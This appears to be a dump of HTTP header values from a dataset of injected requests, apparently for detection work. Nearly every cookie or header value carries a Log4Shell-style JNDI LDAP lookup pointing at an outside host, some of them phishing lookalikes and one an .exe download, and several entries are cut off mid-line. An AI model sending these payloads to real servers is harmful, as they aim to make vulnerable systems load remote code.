# data:['ck=i8_zOiDVLeh68IngvOREmv1l5Xpz2Jbvai8ICxtQwfA; Domain=realtor.com/property-search/Kingman_AZ/streetlistings-h; Expires=Wed, 25 Jan 2023 01:36:24 GMT', 'uu=fGEZmQZYtzyodhNW5Km2CzPsynswueTHbnDOR3E0Ui4Zb4Pwf9_w9djTkfGMItwa1MwAxjvIRWy6skHaMx0cug; Domain=rutlandherald.com/apps/pbcs.dll/article?AID=/20111113/OBITUARIES/711139945/-1/RSS10; Expires=Mon, 06 Feb 2023 01:36:24 GMT', 'session=a072175c-c708-4fab-9718-692959db5e84; Expires=Sun, 18 Dec 2022 01:55:24 GMT']${jndi:ldapwww.ambmarques.com/~mpseu/l/}
#
# index:	2577
# col name:	request.headers.Set-Cookie
# data:['ck=ATooKbvZypkLQUzyS6BYPQ; Domain=tools.ietf.org/html/rfc2010; Expires=Wed, 04 Jan 2023 01:28:37 GMT', 'uu=f1ZiRseEL-EIYshlX5drNQm2nDfS-Jw5ESi5Ce0OkI8; Domain=cachevalleydaily.com/sports/Utah-State-Announces-2010-11-Mens-Basketball-Schedule-102195324.html; Expires=Wed, 28 Dec 2022 01:28:37 GMT', 'session=71762b90-f77d-4b4e-b9da-c030c553e440; Expires=Sun, 18 Dec 2022 02:25:37 GMT']${jndi:ldaphttp://www.westernpools.com.br/sejeal.jpg}
#
# index:	2611
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapatsdr.cdc.gov/hac/pha/pha.asp?docid=740&pg=1}
#
# index:	2631
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldappurduesports.com/sports/m-baskbl/sched/pur-m-baskbl-sched.html}
#
# index:	2641
# col name:	request.headers.Set-Cookie
# data:['cid=NX4v-H92pUWzs4dt4vdlpwKBSRpCb0OzznGtutyM0m1pmO_QENALUf5CfkTUKNIF4UTF7uv39mA_WIBaDRr3Lum0FSyD8Z3wohNa93t_jyXNRNKwYnNhx4WbBzAOHy0tHx43jRhAexR3oLjfkx06X40ara5X5CVboWicd1nKOwI; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02
Iaxm6mzFqgNmmNwQbT6AgYzVnWLucPQ-DuWqohnBugHREMLawzH33L4; Domain=35thregistry.com/; Expires=Wed, 11 Jan 2023 01:22:03 GMT', 'session=e90ca7a6-0344-4f1a-9d4f-929c3dd27400; Expires=Sun, 18 Dec 2022 01:47:03 GMT']${jndi:ldaphttps://archive.org/search.php?query=mediatype:texts&sort=-publicdate&and[]=subject%3A%22Registers%20of%20births%2C%20etc%22}
#
# index:	2953
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapyoutube.com/watch?v=yZxRXYo1i4I}
#
# index:	2954
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapinvesting.businessweek.com/research/stocks/people/person.asp?personId=26556441&capId=6528032&previousCapId=6528032&previousTitle=James%20A%20Rhodes%20State%20College}
#
# index:	2964
# col name:	request.headers.Set-Cookie
# data:['cid=lfwSCP3mK74-ODErIIHxeXkWHXqpCDmJ6KoAv5J27-LuH0yzjwWu01QXtPsm-aJ9pNnCQeNnv3IIQ_xOxBPx0Tj64ZL1bdoPSwIIvhIOa49bPTZLnQ66PGj7mi7hN6s_jbU6GLNockhGd2H2vxWnv55DAvFjivhGlIk0nT0uoSg; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:54:28 GMT', 'ck=iJ8FH-hU0Sj8BqZQ2OtTsMqjl_TWAgUAd3N0vzGAXjWrCamTCGvcPlMlqu3kQRs2zQ57vWrZDm8JMLhUjzzr840NTV9w1lTR1AHG887x56J-q6Rl464kaT7vkt2w7xRRbROT4N5Q7e5EF5O-2TLPY1kyleafxW3lUdtePtWt19E; Domain=amren.com/; Expires=Wed, 08 Feb 2023 01:24:28 GMT', 'uu=qy04ff0XJfoSlImUWtone7VHH4PkpFwf_bfLhwUBLdE; Domain=http://rfmhvac.com/component/mailto/index.html?tmpl=component&link=7e67867c21f4567768fbdca4d76297989175c376; Expires=Sat, 14 Jan 2023 01:24:28 GMT', 'session=9999d976-fa15-42e9-a53f-e4995a176a0b; Expires=Sun, 18 Dec 2022 02:24:28 GMT']${jndi:ldapathletecalendar.com/details.php?race=8330}
#
# index:	2983
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapfb-lt.facebook.com/people/Chris-Herrera/100001024663181}
#
# index:	3105
# col name:	request.headers.Set-Cookie
# data:['ttauth=VvcK1poX34Ds3e9j-_DKcvL9vUcOez3BDpg9BLVYBDY; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:37:31 GMT', 'ck=-x86NvLMnC30eID9q40ebc7deBsiRS1ofrHaXKvwb00; Domain=dropebox.us; Expires=Sat, 28 Jan 2023 01:28:31 GMT', 'uu=sLIZHuhVGETxcnHAyaSvPGxOvRwD-Cv4BUyNg0UPk36ex7xlqa5b2wNLQv90YbYXqTF1nUQgSrsdP-xJoaSf_J-q7RKCScl0FvnWDAvOf6VsMZEEfZhgNzpdsu6NXfVnpzRZ-K7HA-vQKmmYrHkaSQda2aShbnTwOkUzh6to9Pc; Domain=youtube.com/watch?v=g2wlrHrxeJc; Expires=Sun, 01 Jan 2023 01:28:31 GMT', 'session=2e13fe08-205b-488d-a9bc-39858fe165c9; Expires=Sun, 18 Dec 2022 02:22:31 GMT']${jndi:ldaplistsearches.rootsweb.com/th/index/MORAY/2001-10?m=r&s=Redisplay}
#
# index:	3152
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapyoutube.com/watch?v=xIhiTDxe1wg}
#
# index:	3172
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:
Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:38:20 GMT', 'ck=0_wHn00E0vgDhupkFgw9OA; Domain=www.bengal.net/software.html; Expires=Wed, 08 Feb 2023 01:29:20 GMT', 'uu=tpHpH1-n0I61WITNoOUMl6CfzJCUEt2w-HehJ20RbCU; Domain=www.cs.cmu.edu/~hde/hex/hexfaq/; Expires=Mon, 13 Feb 2023 01:29:20 GMT', 'session=a9ac1d72-0bde-4a74-8afe-c2e19a20d39a; Expires=Sun, 18 Dec 2022 01:50:20 GMT']${jndi:ldaphttp://bestwesternhotelsalobrena.com/blog/index.html}
#
# index:	3891
# col name:	request.headers.Set-Cookie
# data:['ttauth=H6rr4s2MyHYNB7enS98G7g; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:37:02 GMT', 'ck=PjJOZI_bcIPG4SaiwS2PKh2aN6h1fshS4dhylYf1GAcAo8S62-PJ_Bs2I-ZGUBDBr6oY7cgGPEX1Wp2HFVyTV89kGlZFN2l7ndrSkT5ElWJyZErI5JHmsmV60LYs_oUHVUb4PpQ9pSvzxJZuDqaM3wUJsdEjpPGb3vP0ZzVK5xM; Domain=www.gamereport.com/tgr6/airlines.html; Expires=Wed, 25 Jan 2023 01:18:02 GMT', 'uu=0KK5ap-_n6T5-mqtx4KRbw; Domain=www.bjcurio.com/js/index.htm?ref=rrvkodhus.battle.net/d3/en/index; Expires=Sat, 28 Jan 2023 01:18:02 GMT', 'session=2a1c1206-11b4-43c8-b42c-5cd0626bbe32; Expires=Sun, 18 Dec 2022 02:15:02 GMT']${jndi:ldaphealthlaw.balch.com/attorneys/}
#
# index:	3900
# col name:	request.headers.Set-Cookie
# data:['ck=HT5HXcbJxtqFavvDsMSS2UNxXEBGKglybXFGHjsymaOSCNzPEAZnSsgB56YX1pNOP7169cqQdw-P4duz40ea_vkznyiiC831F3s9npuHROJsdWLQAhF3EzI0NLKWwQtXBGf0BnSxUGPpATyE3VrYC8s7ya6DHf7laljRKyv6sBc; Domain=register.madscience.org/kalamazoo/; Expires=Thu, 26 Jan 2023 01:20:12 GMT', 'uu=yVKJGi84oWhYHfEcs6CNMQ; Domain=en.wikipedia.org/wiki/1963_Kansas_City_Athletics_season; Expires=Sun, 12 Feb 2023 01:20:12 GMT', 'session=34448265-df52-457e-95ab-68b1971f1208; Expires=Sun, 18 Dec 2022 02:03:12 GMT']${jndi:ldapisthisyour.name/directory/fullnames/fe~nugent.htm}
#
# index:	3917
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapyahoohacks.blogspot.com/}
#
# index:	3925
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapbbuacomtlnemtalpe.net}
#
# index:	3937
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapletrascanciones.mp3lyrics.org/b/beyonce/single-ladies-put/}
#
# index:	3991
# col name:	request.headers.Set-Cookie
# data:['ck=guZ3yeKGXY6zEAy8kn5RjRbqd8pnTxP4xwaAPKa0OC2zsdpwX1bpHjqSOmnUlzs775SjUAeU_ds0hi5U8rf7NT5kAV4j5Kkfl6M491La7ekgFyS9s3Ar2Jdav-EmzaMbN1N6SYJ3iEoajX8sUl523dV3AhmETtM0jCMPybElUIk; Domain=rapiserviciosalvarado.com/PayPaL_servicee.fr/@/PayPa/france/error_login.html?cmd=_login-run&dispatch=5885d80a13c0db1f998ca054efbdf2c29878a435fe324eec2511727fbf3e9efcd8; Expires=Fri, 13 Jan 2023 01:22:43 GMT', 'uu=S1anHboprsNhTFubAYBfdO9PzH0ouRKBgr7ExhlVR0KPVisaoXE_7cx9J9W6Wo40czfydOLw2AMY0XAX1fLX9iaMtE2LXPaHpQZkgFHcN6wqE6QyOn1T-verdSvihmz5brBQoI939vkWy-LZeVh2kcm3_NobJ7v1GVrke7aFsM8; Domain=http://www.easy-process.de/de/der-dokumentation-ihres-managementsystems/19-impressum.html; Expires=Mon, 23 Jan 2023 01:22:43 GMT', 'session=7bb4961d-e3dd-4ad8-858b-02fef8fb259d; Expires=Sun, 18 Dec 2022 01:40:43 GMT']${jndi:ldaphttp://creche-hermonville.com/index.php?option=com_content&view=article&id=70&Itemid=79&fontstyle=f-default}
#
# index:	4061
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapgptours.com/index.php?command=show&what=history&tourid=1051}
#
# index:	4112
# col name:	request.headers.Set-Cookie
# data:['cid=9OAhQ1aJwn6pVyzU3SO6UQvooNupaNM3IsGntKgsP7jPBRLayM4JAAjpXQeYc3Ie_eReoclyNDhpVJw1xCb_hAN4uwRcm1YcBd0jZEORcmpv5CCe2KunyF2Htcv_4cgPfv9N2UqMt8okJJAFo2nge8jBJzk_olrnlWuyn8wNooQ; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:42:29 GMT', 'ck=LMyClxEq8f5WFyPcnTOAgw; Domain=faculty.marianopolis.edu/c.belanger/quebechistory/encyclopedia/emilieGamelin-SistersofCharity-QuebecHistory.htm; Expires=Sun, 08 Jan 2023 01:18:29 GMT', 'uu=2uplO7mOswC4A1f3zT221jaLYU6WDLEWF-0e7x4tPRHc0PaB5RRSPe1f1RP-e1vhBUiB2l3NkZm8G-RdGPHZFQy0kpr6Cy6PqUqhvZNC596xNOzKRZ8FClPGjR47Pf49jQBxKey_52a5cg_Rj7iiKEaKjFbksGij7uh7bf1reGY; Domain=ufdc.ufl.edu/UF00098813/00060; Expires=Mon, 09 Jan 2023 01:18:29 GMT', 'session=39b85d07-be0f-4f61-9a81-45e5a31356bb; Expires=Sun, 18 Dec 2022 01:40:29 GMT']${jndi:ldapdissertations.ub.rug.nl/FILES/faculties/science/1996/a.j.van.der.goot/c9.pdf}
#
# index:	4223
# col name:	request.headers.Set-Cookie
# data:['ck=_m_aAorpJn77EKMUoxnlAWaybfhTp_C_Z_GaGbncWJ4vYEaDR_AgiCaKi2qSeyPY-kEKBMt4JwH_rybSj0utKd4RC4AQcHpSbGUmlj-KPuxTX9aet0mTedvqmRiB6O26dGu3rb9c6ypEBtEeDWYL9go7Oq5LSwqTrVj7RJ4QAoY; Domain=carriermix.com/cable/cogeco.php; Expires=Tue, 14 Feb 2023 01:36:16 GMT', 'uu=hAE0mAs2WiLP7LhPaR84rg; Domain=en.wikipedia.org/wiki/Robert_Harold_Davidson; Expires=Mon, 23 Jan 2023 01:36:16 GMT', 'session=20d715fd-cbf0-47b5-8eea-d2bee8942fcd; Expires=Sun, 18 Dec 2022 02:24:16 GMT']${jndi:ldapdrvodekor.net/modules/mod_login/MyAOL/secure.login/billing/verification/accounts/update/index.html}
#
# index:	4367
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapwaltersgardens.com/}
#
# index:	4378
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapen.wikipedia.org/wiki/Matrimonial_Agency}
#
# index:	4379
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapjdi4nxe1gbjxb7eav8lw.littlematchagirl.com.au}
#
# index:	4383
# col name:	request.headers.Set-Cookie
# data:['cid=NSsteBZlNLlO080OWfIRU7PI2NN6-sd9YA9vA-9lfJaeH1LFZFi3eG3NIiIRW8-e75ZIWUaR9eBUnCybJGq9JHuRPrVTGByiuhyd_-yhPVuskL5PrneHbVOvE2MfdJS-Rn1HobiL8jE1jXvpq6srqR-EZD-BPqdn-U3uSVch2nU; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:51:41 GMT', 'ck=BBRXDfA-xpBopGgWYrXG7dZob8ZaSPVJeIYZvT4_pWo; Domain=facebook.com/philferguson; Expires=Fri, 30 Dec 2022 01:19:41 GMT', 'uu=NuRbwldTPFmrmbgsykKMVgTyc8BzDrP5uaDCZW3dMoY; Domain=tvsmedia.com/portfolio-DollondAitchison_1.html; Expires=Mon, 30 Jan 2023 01:19:41 GMT', 'session=7f1237b3-0008-4203-afaa-f627860ab05b; Expires=Sun, 18 Dec 2022 02:15:41 GMT']${jndi:ldapnytimes.com/2005/05/19/arts/television/19gorshin.html}
#
# index:	4406
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldapyelp.com/biz/sr24-oakland}
#
# index:	4476
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapforesthillpta.com}
#
# index:	4505
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapcompanydatabase.org/c/automobile-dealers-new-cars/new-chevrolet/cadillac-dealer/joe-bowman-auto-plaza.html}
#
# index:	4591
# col name:	request.headers.Set-Cookie
# data:['cid=V4CViMnp6WKAoskQFNQ54V6H4GHdGAK_2NX3C_lK4-_xJXivgTmCSc5ggiwkCkZWWblS6t4pa9nN5jdxTMHboADAjozaq1bTXSjva1tHavbTwSLBTLkciFf3qTM0AJH-Kq13O2ieNP3psUO0G4iii_QdVEpjrThCJacspbZj4RI; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:05:35 GMT', 'ck=_q8_-T3yhISjnskPMK0v6QalCVgx8e76sUSy_Bs71ktbXquO4xRlmGZPnYftpJmUSQ36GKSL2MRxPdHvGLndVl0Q8BFDH_XBT6rLPTebfBnrk3iEQKlXv_MkQ88oWtIeq7EmH4d3ATdlKvOcp5icC3mkBXwTYFcTAhsPf8OjE6c; Domain=youtube.com/watch?v=O2mCW_swjaE; Expires=Sun, 08 Jan 2023 01:35:35 GMT', 'uu=mhHFDD2Lur0cyQKZNSKTrtwefo26L5hS0FaQbEsQou2ZyyYo_KJQSOAdUrYMA5-wx09KegpH1ExN64xR56N0EA; Domain=shieldsharney.com/ourpeople/john-shields.php; Expires=Mon, 06 Feb 2023 01:35:35 GMT', 'session=56351372-e9e4-4626-8bd9-f3db94525767; Expires=Sun, 18 Dec 2022 02:17:35 GMT']${jndi:ldaphttp://chinesevie.com/index.php?option=com_content&view=article&id=92&Itemid=322&lang=en}
#
# index:	4640
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapgd43gds.000a.biz/}
#
# index:	4800
# col name:	request.headers.Set-Cookie
# data:['cid=wHNm4-TGdlJ2xSt-g04hlXzcUyGNCnqmMkUEm5iX8EKN2fbCSqYYinW317XDAwO9Xju99mrWbTeQXAAOA9yEtGIWxitJpd7BJlIgZwaOFDkqQiqDzC5IwXIcEM-mBEHGIphHTaJ6o8ElaWlCTKxOVYH5ppYj5tGn5jXlfyvLKpg; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:35:56 GMT', 'ck=nVOpUNS9jRK5u29tz3pr1w; Domain=http://chinacxyy.com/piccodejs-000.asp?lm2=193&x=4&y=1&w=153&h=104&open=1&n=10&tj=0; Expires=Fri, 10 Feb 2023 01:30:56 GMT', 'uu=hUoFLvkeqYunLbFZPXJ-hRXTSSYY67QpStrTW9k4oIDq3ljDEAbb0SC8-ukfR8TFsKJv9iqvc8Ea7Tkr8swTuQ; Domain=amig0slivechats2.blogspot.com/; Expires=Thu, 12 Jan 2023 01:30:56 GMT', 'session=e1ead56a-49b0-4cc4-9a17-045c9f3bc3d8; Expires=Sun, 18 Dec 2022 01:54:56 GMT']${jndi:ldapaarenobrien.com}
#
# index:	4806
# col name:	request.headers.Set-Cookie
# data:['cid=ZX73kOkitPLdw_6mTkYlMQyq8iXjOM8y7E9Ez-hwQa-PtDhEkGDojxteVXKvJYJviSzR9Ine7aSmCGgZtrGnqEJh1r6779nL_1_FPGyqoWOsoJL2r8Z8GnLcUkFOLn88KVIfBNV_WqVZqFjco-xPMaU7KKBPXWQQ_XCa3gC29Jw; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:36:24 GMT', 'ck=tYinRpFhsCaZe5-W-jVNZVSrpfJj692_u6AJzK10L0kyiI8OxbD0oHEJgGPiZlbTegTvpj8A5s7nlDkrpwuQWuPE50nfIxjy7eVNjyApWZEbFGIc7IlxKUPSkMuHThu5FY-ye43PWDc6j9DSKsIGYCGSgXnBcqEeU47fk0-aYuM; Domain=asianfootballfeast.com/?portfolio=a-league; Expires=Fri, 23 Dec 2022 01:19:24 GMT', 'uu=LNP0soztr9dxsqrTwtKaFT_0Rg_uvN9ufHud4R5SBg4; Domain=themolloys.net/molloy/france/bourbon%20dynasty%20restored/bourbon%20dynasty%20restored.htm; Expires=Tue, 24 Jan 2023 01:19:24 GMT', 'session=dde36f9e-ddc7-457a-8a56-f80f21fdc1f0; Expires=Sun, 18 Dec 2022 01:44:24 GMT']${jndi:ldapevri.com/person/matt-darby-0x39fee3}
#
# index:	4835
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldaphttp://www.cdmorris.com/trojwies.us/forums/images/regimage/fonts/discuss/menuimg.php/uxk/mvewr/?spent=sv1qq07vbm77r}
#
# index:	4934
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapcarusosartcritics.blogspot.com/}
#
# index:	4946
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapwebsters-online-dictionary.org/definitions/dale?cx=partner-pub-0939450753529744%3Av0qd01-tdlq&cof=FORID%3A9&ie=UTF-8&q=dale&sa=Search}
#
# index:	4988
# col name:	request.headers.Set-Cookie
# data:['ttauth=pzxET9JF2j3YgR2_pYXHs5JJXi16kjv0eHpBTWotSU4; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:42:45 GMT', 'ck=wJ-6L5s1R4cMb1GRd5oc5A; Domain=txellwebs.com/blog/wp-content/scap/325c7d4682be8befef7ec375d3287ff8/webscr.html; Expires=Tue, 03 Jan 2023 01:29:45 GMT', 'uu=RBTserulfo8nrcnKJvf0JLjHUuphKdShsil76IVoHC5Dv67TUaFR-ItGKuMY_oN48GQU4hE6PzK-2lbk76gMeA; Domain=bangforchange.blogspot.com/2010/05/big-dan-bang-for-change-mixtape.html; Expires=Sat, 04 Feb 2023 01:29:45 GMT', 'session=ba34a4b7-7d58-4d81-970a-4028006ae442; Expires=Sun, 18 Dec 2022 01:36:45 GMT']${jndi:ldaphttp://paws.org.au/store/admin/view/javascript/fckeditor/editor/plugins/valid.free.fr/adsl}
#
# index:	5019
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapjplafortune.com/prod/projects.html}
#
# index:	5058
# col name:	request.headers.Set-Cookie
# data:['ttauth=-q-Bh7iTF0knXQGK0RbgchyFJpHFPUCM8BZu7-MYT9s8jOhiY-Pir5dsxHy4z9ZliNmRmdjRbua1u136mDVglg; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:04:19 GMT', 'ck=kaNyfcfnSfjpbju_XVKVlB6uYc2JKkB65CA72mnMSz_QfI8K8WmaUSz7bc5c9WFN0ZufDwtaADHBuXWqnYQkdw; Domain=archive.org/stream/lifeofmaryqueeno00headuoft/lifeofmaryqueeno00headuoft_djvu.txt; Expires=Wed, 15 Feb 2023 01:25:19 GMT', 'uu=KZdJ3aOLD8PRZ-3QwPHGd48OZrikUXEBCBZAbmjj5ro; Domain=http://www.portaflores.com/index.php?option=com_user&view=reset; Expires=Wed, 18 Jan 2023 01:25:19 GMT', 'session=362274eb-af93-4959-9651-d4189a13a957; Expires=Sun, 18 Dec 2022 02:08:19 GMT']${jndi:ldapcisj.co.uk/wp-includes/css/boa/sas/index.php}
#
# index:	5135
# col name:	request.headers.Set-Cookie
# data:['ck=n6R5vuWx-_rFHSkNS4y9tbzPOAGboImudXcalB6OwLaTlTwN8LquaqIsGo_HE9DUHtUoazr1vBCwILVPcRDY3ou0QQnRvySJt8EklLDMFYPFWtTk4dEaJcBXt6GKTZcTSmpo6Ma6GOWJMDqIhxeu-0vvOc2bQLCo7jOi2vzZgRs; Domain=servicemagic.com/usp/Blank-and-Mackenzie-Masonry/111520; Expires=Sat, 11 Feb 2023 01:18:05 GMT', 'uu=5GbV7pQveQOgX3qNSr7MYA; Domain=simmons-rentschler.com/obituaries/; Expires=Mon, 06 Feb 2023 01:18:05 GMT', 'session=898c0ad8-b422-4410-80c3-68bd6690b214; Expires=Sun, 18 Dec 2022 02:02:05 GMT']${jndi:ldapanswers.com/topic/sept-iles-1}
#
# index:	5173
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapgeneralhospital.about.com/b/2011/06/19/daytime-emmy-award-winners.htm}
#
# index:	5191
# col name:	request.headers.Set-Cookie
# data:['cid=yswBQs7LlLd9aJ7uUlFQVocPAqlZI9pr5vJtB3hz4R0agZajU76IctAbx7r8iWT4-0RbvW7PqYFh7eKmamTZMXALeunaXs22QqMRVowJ7xGrMQ1JGVigLEily8lQIQnH9BYGxoEEWWRve8-MG4ujNylmlwuWxZD8aYozwgy4e24; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:01:20 GMT', 'ck=xK9F7yF3oA8owHyKaH0xhMngVXLHdvjz0n21xIfPcdkM1zEM7v6g4noE4bwzkJpuHR4F0QgeXxB0OdUdOa53ljhu9MO2Y9gIPPyV7d_6FfxmToBV0v77OCRQoE1nVJ5hrbGfiWW4j3QwK-qBsuhlP6NvaD7cOYd5vb0FxV6v5uI; Domain=nevilles.com/biography/charles/; Expires=Tue, 14 Feb 2023 01:29:20 GMT', 'uu=jp9Yx5kajKJA6kGVBpv12Q; Domain=modelmayhem.com/460623; Expires=Sat, 14 Jan 2023 01:29:20 GMT', 'session=6f78f516-16a5-4854-9b8d-a17ce253a31f; Expires=Sun, 18 Dec 2022 01:44:20 GMT']${jndi:ldaponline.christianvilla.it}
#
# index:	5199
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://www.tirs-online.de/aktionen/demos-a-kundgebungen/311-2012-10-27-stuttgart-pelzfrei}
#
# index:	5225
# col name:	request.headers.Sec-Fetch-Dest
# data:document${jndi:ldaphttp://top5bestwebhosts.com/web-host-companies/host-gator}
#
# ...
#
# index:	180787
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapparl.gc.ca/MembersOfParliament/ProfileConstituency.aspx?Key=384&Language=E}
#
# index:	180789
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldappaypal.com.cgi-bin-webscr-cmd-login-submit-dispatch-5885d80a13c0db1f.8e263663d3faee8d195a.86f1d217942f74.15cf1b2a7a8z9f5z4f7z8z9z7rr752c2b1d5z54e7aa1c48a4d4ds4d4h1c2h31.jentech.com.au/}
#
# index:	180798
# col name:	request.headers.Set-Cookie
# data:['ttauth=93gzvDgDd8ZaDohncSSaesB_pDUPlQHno7I3VEcHziezcjCXdZbpvy-WfQG5RgAxYrumscdIPwenhsfmUioGGw; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:25:17 GMT', 'ck=ZB7egT-xfG2gRnjp42l-0-jlyH8iqqf3EYHZr2dnSNQ; Domain=ababmx.com/index.php?page=default/halloffame&year=1999; Expires=Wed, 15 Feb 2023 01:17:17 GMT', 'uu=RZRaJa5uBwmtDW7m8e25k585RtGHCUh4bko1BJJAWIWveWbgrXicSxxaVfFlU40rTnNOG-kt9BPgEcj5NfPC5Q; Domain=tripadvisor.com/Hotel_Review-g1118194-d1204261-Reviews-Arcadien_Hotel_Spa-Les_Arcs_Savoie_Rhone_Alpes.html; Expires=Thu, 29 Dec 2022 01:17:17 GMT', 'session=9cbed67f-0b51-41d9-8f54-1d2a63fdb5bc; Expires=Sun, 18 Dec 2022 02:11:17 GMT']${jndi:ldapjennypatten.com/}
#
# index:	180830
# col name:	request.headers.Set-Cookie
# data:['cid=dit3Clkm58ZXqA9dnUuBrF7-hBoB53qJtEApFrwYRbmhrHKQ4oRaVYqhEfF0ZHh61lBBT5QK7SsijpcA6OGoXakqwYinsgBQ835koBKCPyXRXZXdjbKmLFgDHM96iXGetMhZKyaeeRtVaE8Smp1kMhXhmWAcgTKHAdbIJWoQ4rY; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 01:44:26 GMT', 'ck=qSODI2VoC7Vn4UY16EAzBuCr-v4-aY3GsQkLUtyYzuBtwEopOqsBbmiLIZMfNxyGdVRvMvhWdkyh0dzzzzuOrA; Domain=http://www.malsaker.nu/bokning-pris/38-bokning; Expires=Sat, 21 Jan 2023 01:36:26 GMT', 'uu=Uotj0_BA12PI-AsMbr3RukNtqToCLvxMhHXp-I3u1e506D301oMDqaBWALi8CJnPv3RgB9OQkpxYLDSr9QTQ5A8J5QBNyhkTKZ1rkUv0ACZpvj588EWtoWydBt1iIIZ_CqXgyyxzqbC3CgFCImOG3zct1F76w6tODeIeHexp7J8; Domain=http://classics4life.com/index.php.1; Expires=Tue, 24 Jan 2023 01:36:26 GMT', 'session=7859f515-f1b7-40c5-90a9-0aa321a8f745; Expires=Sun, 18 Dec 2022 02:14:26 GMT']${jndi:ldapmystore411.com/store/view/55841/Canada/Walmart-Ste-dorothee}
#
# index:	180904
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldaplogin.icloud.com.appleid-user-redirect.session-secure.javaservermy.com}
#
# index:	180920
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapreversemortgagelosangeles.net/}
#
# index:	180973
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldapwww.paypal.it.31929.amezionuk.org/ZGFuaWVsYS5ib25hdmVudHVyYUBhbnRvbnZlbmV0YS5pdA==/login.do}
#
# index:	180988
# col name:	request.headers.Accept-Encoding
# data:gzip, deflate, br${jndi:ldaphttp://djkatrina.ru/persony/biografii/marco-zenker.html}
#
# index:	181083
# col name:	request.headers.Set-Cookie
# data:['ttauth=rN-qsFFXQ4bTEGFat5VrEmwv6Pzp7uSLUrdhNJ5qXRLI7G2xVzAVW0rlfuhfLVRGJ8dIRiqybL8_5Ur19rIWYoPZwbtkdVtk4nh9TQcZU74Pirk2pPei2oeAmmw5NpqVDkFiPwo3s7xb7ephGa-zCBkRiA_uL-wqPg1rn8fhyYM; Domain=localhost:5000; Expires=Sun, 18 Dec 2022 02:30:49 GMT', 'ck=4y4EOquqLSu5aE8KaksYmseuPGZKU_Bk0Ik6nSozWRaC4FPC-6vGqkqJke8CpjJLshnlX4WiNpSjTZTTkk9AKD_1Npb-3zWu1mWyLRw84I1v3j8a6ZVD7HXHojXPbqVupqDCRSMUvu2z_aqMobijyacvWYNkwCiCfm2-G1K9pEo; Domain=en.wikipedia.org/wiki/Arigat%C5%8D_(Sekai_no_Doko_ni_Ite_mo); Expires=Fri, 13 Jan 2023 01:37:49 GMT', 'uu=pxaWENeiFVLu39CVm7EQpuXn2iq816IGNuiWNlEyzfjfw9bd-ZfXDvbNVhM6wXUq6yONY4IK88k-8YcabSrZwA; Domain=http://www.gypsyspirit.eu/archiv/3-archiv-noviniek/10-tlaova-konferencia; Expires=Tue, 24 Jan 2023 01:37:49 GMT', 'session=2b0bc083-3183-4848-921d-232a20832114; Expires=Sun, 18 Dec 2022 02:00:49 GMT']${jndi:ldaphttps://toulousa.com/omg/488EYJSFYHMS.exe}
#
# index:	181093
# col name:	request.headers.Set-Cookie
# data:['ck=ITwiPVsSspK0mWH2MfZ8SeQkuVuaVBtYLth_zbRF4iUEp5o5VxiPJTHXiRjZ3JXTSxVoLywpN9gGXY6AXRgDMg; Domain=pipl.com/directory/name/Odie/James; Expires=Sun, 01 Jan 2023 01:21:01 GMT', 'uu=SHjAORxQyLFcILIGbfH-Nw; Domain=www.nordson.com/Businesses/Powder; Expires=Wed, 01 Feb 2023 01:21:01 GMT', 'session=8d3a71ef-9624-41e7-abb9-4ab21367366f; Expires=Sun, 18 Dec 2022 02:06:01 GMT']${jndi:ldaphttp://dypreprint.com/feedback.html}
#
# index:	181115
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapnewhavenrtc.com/}
#
# index:	181129
# col name:	request.headers.Sec-Fetch-Site
# data:none${jndi:ldapsagarex.us}
#
# index:	181140
# col name:	request.headers.Set-Cookie
